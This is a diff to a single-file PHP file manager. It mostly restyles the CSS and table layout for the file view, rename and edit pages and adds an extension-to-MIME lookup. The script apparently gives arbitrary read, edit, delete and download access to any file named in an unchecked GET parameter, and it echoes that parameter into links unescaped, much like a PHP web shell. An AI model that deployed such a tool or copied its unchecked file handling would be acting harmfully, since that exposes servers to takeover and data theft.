@@ -51,7 +51,7 @@ table th {
 }
 textarea {
 	padding: 12px 20px;
-	width:88%;
+	width:93.5%;
 	height:200px;
 	resize:none;
 	-moz-border-bottom-colors: none;
@@ -80,7 +80,7 @@ input[type=submit] {
   background:rgba(222,222,222,0.73);
 }
 input[type=text].action {
-	width:92%;
+	width:96%;
 	font-family: 'Ubuntu Mono', monospace;
 	padding:12px;
 	color:#8a8a8a;
@@ -173,13 +173,13 @@ a.act {
 	margin-top:-9px;
 	background: #e8e8e8;
 	padding:3px 7px;
-	border:2px solid rgba(222,222,222,0.73);
-	border-right:2px solid #e8e8e8;
+	border:2px solid transparent;
+	border-right:2px solid transparent;
 }
 a.s {
 	margin-top:-9px;
 	border-radius:0px 7px 7px 0px;
-	border:2px solid rgba(222,222,222,0.73);
+	border:2px solid transparent;
 }
 a.s:hover, 
 a.act:hover,
@@ -192,6 +192,14 @@ a.t:hover {
 	background:#e87b7b;
 	border:2px solid #e87b7b;
 	color:#fff;
+}
+a.slc {
+	background:#e87b7b;
+	border:2px solid #e87b7b;
+	color:#fff;
+	pointer-events: none;
+  	cursor: default;
+  	text-decoration: none;
 }
 a.acs:hover {
 	background:#e87b7b;
@@ -223,12 +231,18 @@ a.acs {
 	margin-left:-12px;
 	background: #e8e8e8;
 	padding:3px 7px;
-	border:2px solid rgba(222,222,222,0.73);
+	border:2px solid transparent;
+	border-left:2px solid #e8e8e8;
+}
+a.fe {
+	margin-left:-12px;
+	padding:3px 7px;
+	border:2px solid transparent;
 	border-left:2px solid #e8e8e8;
 }
 a.c {
 	background: #e8e8e8;
-	border:2px solid rgba(222,222,222,0.73);
+	border:2px solid transparent;
 	border-radius:7px;
 	margin-top:-9px;
 	width:70px;
@@ -237,6 +251,15 @@ a.c {
 a.l {
 	margin-left:-12px;
 	border-left:2px solid #e8e8e8;
+}
+td.mas {
+	padding:3px 10px;
+}
+td.sup {
+	width:0.1px;
+}
+td.lol {
+	width:0.1px;
 }
 tr.file:last-child {
 	border-bottom:none;
@@ -293,6 +316,9 @@ input[type=submit] {
   
   table td {
     font-size: .9em;
+  }
+  a.fo {
+  	font-size:10px;
   }
   
   textarea {
@@ -472,42 +498,125 @@ if (@$_GET['action'] == 'file') {
 	$file = $_GET['file'];
 	?>
 	<tr>
-		<td class="not">
+		<td class="not mas sup">
+			<span class="a">
+				Filename
+			</span>
+		</td>
+		</div>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<span><u><?=permission(cwd(),basename($file))?></u></span>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Size 
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=size($file)?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not mas">
+			<span class="a">
+				Type
+			</span>
+		</td>
+		<td class="not mas lol"><center>:</center></td>
+		<td class="not mas">
+			<?=get_type($file)?>
+		</td>
+	</tr>
+	<tr>
+		<td class="not" colspan="3">
 			<center>
-				<div class="action">
-					<div class="act asd">
-						<span class="a">
-							Filename : <span><u><?=permission(cwd(),basename($file))?></u></span>
-						</span><br>
-						<span class="a">
-							Size : <?=size($file)?>
-						</span><br>
-						<span class="a">
-							Type : <?=mime_content_type($file)?>
-						</span>
-						<center>
-						<a class="b act c z" href="?path=<?=cwd()?>">Back</a><br><p>
-						<a class="act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
-						<a class="acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
-						<a class="acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
-						<a class="acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
-						<a class="s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a><p>
-						<textarea readonly style="background:none;">
-							<?php print htmlspecialchars(file_get_contents(basename($file))) ?>
-						</textarea>
-						</center>
-					</div>
-				</div>
+				<a class="fo act acs c" href="?path=<?=cwd()?>">FILES</a>
+				<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+				<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+				<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
 			</center>
+		</td>
+	</tr>
+	<tr>
+		<td class="not" colspan="3">
+			<textarea readonly><?php print htmlspecialchars(file_get_contents(basename($file))) ?>
+			</textarea>
 		</td>
 	</tr>
 	<?php
 	exit();
 }
+function get_type($filename) {
+    $idx = explode( '.', $filename );
+    $count_explode = count($idx);
+    $idx = strtolower($idx[$count_explode-1]);
+    $mimet = array( 
+        'txt' 	=> 'text/plain',
+        'htm' 	=> 'text/html',
+        'html' 	=> 'text/html',
+        'php' 	=> 'text/php',
+        'php1' 	=> 'text/php',
+        'php2' 	=> 'text/php',
+        'phtml' => 'text/php',
+        'css' 	=> 'text/css',
+        'ttf' 	=> 'font/sfnt',
+        'js' 	=> 'application/javascript',
+        'json' 	=> 'application/json',
+        'xml' 	=> 'application/xml',
+        'swf' 	=> 'application/x-shockwave-flash',
+        'flv' 	=> 'video/x-flv',
+        'png' 	=> 'image/png',
+        'jpe' 	=> 'image/jpeg',
+        'jpeg' 	=> 'image/jpeg',
+        'jpg' 	=> 'image/jpeg',
+        'gif' 	=> 'image/gif',
+        'bmp' 	=> 'image/bmp',
+        'ico' 	=> 'image/vnd.microsoft.icon',
+        'tiff' 	=> 'image/tiff',
+        'tif' 	=> 'image/tiff',
+        'svg' 	=> 'image/svg+xml',
+        'svgz' 	=> 'image/svg+xml',
+        'zip' 	=> 'application/zip',
+        'rar' 	=> 'application/x-rar-compressed',
+        'exe' 	=> 'application/x-msdownload',
+        'msi' 	=> 'application/x-msdownload',
+        'cab' 	=> 'application/vnd.ms-cab-compressed',
+        'mp3' 	=> 'audio/mpeg',
+        'qt' 	=> 'video/quicktime',
+        'mov' 	=> 'video/quicktime',
+        'pdf' 	=> 'application/pdf',
+        'psd' 	=> 'image/vnd.adobe.photoshop',
+        'ai' 	=> 'application/postscript',
+        'eps' 	=> 'application/postscript',
+        'ps' 	=> 'application/postscript',
+        'doc' 	=> 'application/msword',
+        'rtf' 	=> 'application/rtf',
+        'xls' 	=> 'application/vnd.ms-excel',
+        'ppt' 	=> 'application/vnd.ms-powerpoint',
+        'docx' 	=> 'application/msword',
+        'xlsx' 	=> 'application/vnd.ms-excel',
+        'pptx' 	=> 'application/vnd.ms-powerpoint',
+        'odt' 	=> 'application/vnd.oasis.opendocument.text',
+        'ods' 	=> 'application/vnd.oasis.opendocument.spreadsheet',
+    );
+
+    if (isset( $mimet[$idx] )) {
+     return $mimet[$idx];
+    } else {
+     return 'application/octet-stream';
+    }
+ }
+
 function alert($type, $msg) {
 	?>
 	<tr>
-		<td class="not">
+		<td class="not" colspan="3">
 			<div class="alert <?=$type?>">
 				<span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span>
 				<strong><?=$type?>!</strong> <?=$msg?>
@@ -677,22 +786,58 @@ if (isset($_GET['rename'])) {
 	?>
 	<form method="post">
 		<tr>
-			<td class="not">
+			<td class="not mas sup">
+				<span class="a">
+					Filename
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<span><u><?=permission(cwd(),basename($file))?></u></span>
+			</td>
+		</tr>
+		<tr>
+			<td class="not mas">
+				<span class="a">
+					Size 
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<?=size($file)?>
+			</td>
+		</tr>
+		<tr>
+			<td class="not mas">
+				<span class="a">
+					Type
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<?=get_type($file)?>
+			</td>
+		</tr>
+		<tr>
+			<td class="not" colspan="3">
 				<center>
-					<div class="action_f">
-						<div class="act">
-						<span class="a">Filename : <u><?= permission($file, basename($file)) ?></u></span><br>
-						<span class="a">Size : <?=size($file)?></span><br>
-						<span class="a">Type : <?=mime_content_type($file)?></span>
-						&nbsp;&nbsp;
-						<a class="b act s" href="?path=<?=cwd()?>&action=file&file=<?=$file?>">action</a>
-						<a class="b act" href="?path=<?=cwd()?>">back</a>
-						</div><br>
-						<input class="action" type="text" name="newname" value="<?=basename($file)?>"><br><br>
-						<input style="width:100%;" type="submit" name="submit" value="RENAME">
-					</div>
-					</div>
+					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
+					<a class="fo act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+					<a class="fo slc fe" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+					<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+					<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+					<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
 				</center>
+			</td>
+		</tr>
+		<tr>
+			<td class="not" colspan="3">
+				<input class="action" type="text" name="newname" value="<?=basename($file)?>">
+			</td>
+		</tr>
+		<tr>
+			<td colspan="3">
+				<input style="width:100%;" type="submit" name="submit" value="RENAME">
 			</td>
 		</tr>
 	</form>
@@ -709,35 +854,64 @@ if (isset($_GET['edit'])) {
 		}
 	}
 	?>
-		<form method="post">
-			<tr>
-				<td class="not">
-					<center>
-						<?=cwd()?>/
-					</center>
-				</td>
-			</tr>
-			<tr>
-				<td class="not">
-					<center>
-					<div class="action_f">
-						<div class="act">
-						<span class="a">Filename : <?= permission($file, basename($file)) ?></span><br>
-						<span class="a">Size : <?=size($file)?></span><br>
-						<span class="a">Type : <?=mime_content_type($file)?></span>
-						&nbsp;&nbsp;
-						<a class="b act s" href="?path=<?=cwd()?>&action=file&file=<?=$file?>">action</a>
-						<a class="b act" href="?path=<?=cwd()?>">back</a>
-						</div><br>
-						<?=@$alert?>
-						<textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
-						<input style="width:100%;" type="submit" name="submit">
-					</div>
-					</div>
-					</center>
-				</td>
-			</tr>
-		</form>
+	<form method="post">
+		<tr>
+			<td class="not mas sup">
+				<span class="a">
+					Filename
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<span><u><?=permission(cwd(),basename($file))?></u></span>
+			</td>
+		</tr>
+		<tr>
+			<td class="not mas">
+				<span class="a">
+					Size 
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<?=size($file)?>
+			</td>
+		</tr>
+		<tr>
+			<td class="not mas">
+				<span class="a">
+					Type
+				</span>
+			</td>
+			<td class="not mas lol"><center>:</center></td>
+			<td class="not mas">
+				<?=get_type($file)?>
+			</td>
+		</tr>
+		<tr>
+			<td class="not" colspan="3">
+				<center>
+					<a class="fo act acs c" href="?path=<?=cwd()?>" disable='disabled'>FILES</a>
+					<a class="fo slc act t" href="?path=<?=cwd()?>&edit&file=<?=$file?>">EDIT</a>
+					<a class="fo acs" href="?path=<?=cwd()?>&rename&file=<?=$file?>">RENAME</a>
+					<a class="fo acs" href="?path=<?=cwd()?>&chmod&file=<?=$file?>"> CHMOD</a>
+					<a class="fo acs" href="?path=<?=cwd()?>&delete&file=<?=$file?>">DELETE</a>
+					<a class="fo s act t l" href="?path=<?=cwd()?>&download&file=<?=$file?>">DOWNLOAD</a>
+				</center>
+			</td>
+		</tr>
+		<tr>
+			<td class="not" colspan="3">
+				<textarea name="text"><?= htmlspecialchars(file_get_contents($file)) ?></textarea>
+				</textarea>
+			</td>
+		</tr>
+		<tr>
+			<td colspan="3">
+				<input style="width:100%;" type="submit" name="submit">
+			</td>
+		</tr>
+	</form>
 	<?php
 	exit();
 }
